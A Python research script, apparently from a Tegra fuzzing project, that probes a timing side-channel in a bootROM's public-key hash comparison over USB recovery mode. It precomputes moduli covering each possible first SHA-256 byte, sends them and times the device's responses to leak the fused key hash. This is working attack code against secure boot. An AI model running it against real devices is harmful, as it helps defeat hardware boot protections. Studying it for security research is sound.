"""Probe timing side-channel in bootROM's pubkey hash comparison.

The bootROM computes SHA-256(our_modulus) and compares it byte-by-byte
against FUSE_PUBLIC_KEY0-7 using a timing-variable memcmp (FUN_001043a2).
Each matching byte adds ~3-5 ns before the early-exit.

Strategy:
  1. Pre-compute pubkeys whose SHA-256 starts with each possible byte (0x00-0xFF)
  2. Send each pubkey to the device and measure response time
  3. The byte value that produces a slightly longer response = fuse_hash[0]
  4. Repeat with 2-byte prefixes to extract fuse_hash[1], etc.

This script does step 1 (offline) then step 2 (on device) for byte 0.
Each test requires a fresh RCM entry (unplug/replug).

Usage:
    # Phase 1: Pre-compute pubkey table (offline, ~30 seconds)
    python -m tegra_fuzz.rcm_timing_probe --precompute

    # Phase 2: Test one specific hash byte on device
    sudo python -m tegra_fuzz.rcm_timing_probe --test-byte 0xAB

    # Phase 3: Measure baseline timing variance (same pubkey, N trials)
    sudo python -m tegra_fuzz.rcm_timing_probe --baseline N
"""
import struct, sys, time, hashlib, os, json, random
from pathlib import Path
import usb.core, usb.util

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
VID, PID = 0x0955, 0x7321
MSG_LEN = 0x30298
HEADER_SIZE = 0x2A8
CHUNK = 0x1000

TABLE_PATH = str(_PROJECT_ROOT / "findings" / "pubkey_hash_table.json")


def sha256_of_modulus(modulus_bytes):
    return hashlib.sha256(modulus_bytes).digest()


def precompute_table():
    """Find 256 modulus values, one for each possible first SHA-256 byte."""
    print("Pre-computing pubkey hash table...")
    print("Finding a modulus for each of 256 possible SHA-256 first bytes...")

    table = {}  # byte_value -> modulus_hex
    found = set()

    # Use a 256-byte modulus with a 4-byte counter at the start
    attempts = 0
    while len(found) < 256:
        # Random 256-byte modulus
        modulus = bytearray(os.urandom(256))
        h = sha256_of_modulus(bytes(modulus))
        first_byte = h[0]

        if first_byte not in found:
            found.add(first_byte)
            table[str(first_byte)] = {
                'modulus': modulus.hex(),
                'sha256': h.hex(),
                'first_byte': first_byte,
            }
            if len(found) % 32 == 0:
                print(f"  Found {len(found)}/256 unique first bytes ({attempts} attempts)")

        attempts += 1

    print(f"Done: {attempts} attempts for 256 unique first bytes")
    print(f"  Average: {attempts/256:.1f} attempts per byte")

    with open(TABLE_PATH, 'w') as f:
        json.dump(table, f, indent=2)
    print(f"Saved to {TABLE_PATH}")

    # Also find multiple moduli for the all-zeros hash (baseline)
    zero_hash = sha256_of_modulus(bytes(256))
    print(f"\nBaseline: SHA-256(zeros) = {zero_hash.hex()[:16]}...")
    print(f"  First byte: 0x{zero_hash[0]:02X}")

    return table


def load_table():
    with open(TABLE_PATH, 'r') as f:
        return json.load(f)


def ep0_read(dev, timeout=500):
    try:
        return bytes(dev.ctrl_transfer(0x82, 0x00, 0, 0x81, 255, timeout))
    except Exception:
        return None


def build_msg_with_modulus(modulus_bytes):
    msg = bytearray(MSG_LEN)
    struct.pack_into('<I', msg, 0x000, MSG_LEN)
    msg[0x004:0x104] = modulus_bytes[:256]
    return msg


def send_and_time(dev, msg):
    """Send RCM message and return (status, timing_ns) or (None, None)."""
    total_chunks = 49

    total_sent = 0
    for i in range(total_chunks):
        start = i * CHUNK
        end = min(start + CHUNK, MSG_LEN)
        chunk = bytes(msg[start:end])
        try:
            w = dev.write(0x01, chunk, timeout=5000)
            total_sent += w
        except usb.core.USBError:
            return None, None

    # Dummy byte
    try:
        dev.write(0x01, b'\x00', timeout=2000)
    except usb.core.USBError:
        pass

    # Time the response
    t0 = time.perf_counter_ns()
    try:
        resp = bytes(dev.read(0x81, 4096, timeout=5000))
        t1 = time.perf_counter_ns()
        if len(resp) >= 4:
            status = struct.unpack_from('<I', resp, 0)[0]
            return status, t1 - t0
    except Exception:
        pass

    return None, None


def setup_device():
    dev = usb.core.find(idVendor=VID, idProduct=PID)
    if not dev:
        return None

    try:
        if dev.is_kernel_driver_active(0):
            dev.detach_kernel_driver(0)
    except (NotImplementedError, usb.core.USBError):
        pass

    for _ in range(3):
        if ep0_read(dev, timeout=1000):
            break
        time.sleep(0.3)
    else:
        print("EP0 baseline failed")
        return None

    try:
        dev.set_configuration()
        usb.util.claim_interface(dev, 0)
    except usb.core.USBError:
        pass

    try:
        dev.read(0x81, 16, timeout=2000)
    except Exception:
        print("Device ID read failed")
        return None

    return dev


def test_single_byte(target_byte):
    """Send a modulus whose SHA-256 starts with target_byte, measure timing."""
    table = load_table()
    entry = table.get(str(target_byte))
    if not entry:
        print(f"No entry for byte 0x{target_byte:02X}")
        return

    modulus = bytes.fromhex(entry['modulus'])
    expected_hash = entry['sha256']

    print(f"Testing byte 0x{target_byte:02X}")
    print(f"  Modulus: {modulus[:8].hex()}...")
    print(f"  SHA-256: {expected_hash[:16]}...")

    dev = setup_device()
    if not dev:
        print("ERROR: No device"); return

    msg = build_msg_with_modulus(modulus)
    status, timing = send_and_time(dev, msg)

    if status is not None:
        print(f"  Status: 0x{status:08X}")
        print(f"  Timing: {timing} ns ({timing/1000:.1f} us)")
    else:
        print("  FAILED — no response")


def measure_baseline(n_trials):
    """Measure timing variance for the SAME pubkey (all zeros) across N device cycles."""
    print(f"Baseline timing measurement: {n_trials} trials")
    print("Each trial requires re-entering RCM (unplug → VOL+ → plug)")
    print()

    zero_modulus = bytes(256)
    zero_hash = sha256_of_modulus(zero_modulus)
    print(f"Modulus: all zeros")
    print(f"SHA-256: {zero_hash.hex()[:16]}... (first byte: 0x{zero_hash[0]:02X})")
    print()

    timings = []

    for trial in range(n_trials):
        input(f"Trial {trial+1}/{n_trials} — enter RCM and press Enter: ")

        dev = setup_device()
        if not dev:
            print("  No device — skipping")
            continue

        msg = build_msg_with_modulus(zero_modulus)
        status, timing = send_and_time(dev, msg)

        if status is not None:
            timings.append(timing)
            print(f"  Status: 0x{status:08X}  Timing: {timing} ns ({timing/1000:.1f} us)")
        else:
            print("  FAILED")

    if timings:
        import statistics
        print(f"\n--- Results ({len(timings)} successful) ---")
        print(f"  Mean:   {statistics.mean(timings):.0f} ns ({statistics.mean(timings)/1000:.1f} us)")
        print(f"  Median: {statistics.median(timings):.0f} ns ({statistics.median(timings)/1000:.1f} us)")
        print(f"  Stdev:  {statistics.stdev(timings):.0f} ns ({statistics.stdev(timings)/1000:.1f} us)" if len(timings) > 1 else "")
        print(f"  Min:    {min(timings)} ns")
        print(f"  Max:    {max(timings)} ns")
        print(f"  Range:  {max(timings) - min(timings)} ns ({(max(timings)-min(timings))/1000:.1f} us)")

        # Save results
        out = {
            'modulus': 'zeros',
            'sha256_first_byte': zero_hash[0],
            'timings_ns': timings,
        }
        outpath = str(_PROJECT_ROOT / "findings" / "timing_baseline.json")
        with open(outpath, 'w') as f:
            json.dump(out, f, indent=2)
        print(f"\nSaved to {outpath}")


def main():
    if '--precompute' in sys.argv:
        precompute_table()
        return 0

    if '--test-byte' in sys.argv:
        idx = sys.argv.index('--test-byte')
        if idx + 1 < len(sys.argv):
            byte_val = int(sys.argv[idx + 1], 0)
            test_single_byte(byte_val)
            return 0

    if '--baseline' in sys.argv:
        idx = sys.argv.index('--baseline')
        n = int(sys.argv[idx + 1]) if idx + 1 < len(sys.argv) else 5
        measure_baseline(n)
        return 0

    print(__doc__)
    return 0


if __name__ == '__main__':
    sys.exit(main() or 0)
